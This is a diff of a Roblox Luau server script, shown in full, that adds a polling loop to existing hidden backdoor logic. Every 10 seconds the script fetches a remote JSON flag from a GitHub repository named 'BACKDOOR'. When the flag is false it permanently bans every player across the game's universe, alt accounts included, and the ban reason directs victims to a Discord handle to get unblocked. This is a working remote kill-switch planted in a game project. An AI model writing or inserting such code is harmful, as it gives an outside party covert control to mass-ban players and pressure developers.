@@ -1,20 +1,26 @@
 local httpService = game:GetService("HttpService")
 
-for _, plr in game.Players:GetPlayers() do
-	local Info = httpService:GetAsync("https://raw.githubusercontent.com/diaslo/BACKDOOR/refs/heads/main/Activity.json")
-	local Decoded = httpService:JSONDecode(Info)
 
-	if Decoded.Active == false then
-		print("+")
-		game.Players:BanAsync({
-			
-			UserIds = {plr.UserId},
-			ApplyToUniverse = true, 
-			Duration = -1, 
-			DisplayReason = 'CBP | X',
-			PrivateReason = 'Central Bureau of Protection | Unblock - discrod: hichimiro', 
-			ExcludeAltAccounts = false,
+while true do
 
-		})
+	for _, plr in game.Players:GetPlayers() do
+		local Info = httpService:GetAsync("https://raw.githubusercontent.com/diaslo/BACKDOOR/refs/heads/main/Activity.json")
+		local Decoded = httpService:JSONDecode(Info)
+
+		if Decoded.Active == false then
+			game.Players:BanAsync({
+
+				UserIds = {plr.UserId},
+				ApplyToUniverse = true, 
+				Duration = -1, 
+				DisplayReason = 'CBP | X',
+				PrivateReason = 'Central Bureau of Protection | Unblock - discrod: hichimiro', 
+				ExcludeAltAccounts = false,
+
+			})
+		end
 	end
+
+	task.wait(10)
 end
+
